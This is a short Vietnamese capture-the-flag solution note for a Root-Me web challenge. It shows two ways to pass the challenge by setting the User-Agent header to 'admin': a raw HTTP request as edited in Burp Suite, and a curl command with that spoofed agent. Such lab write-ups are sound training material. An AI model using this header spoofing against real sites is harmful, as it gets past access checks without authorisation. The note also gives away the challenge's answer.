Cách 1: Dùng Burp Suite

GET /web-serveur/ch2/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: admin 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: admin

Cách 2

curl -A 'admin' http://challenge01.root-me.org/web-serveur/ch2/
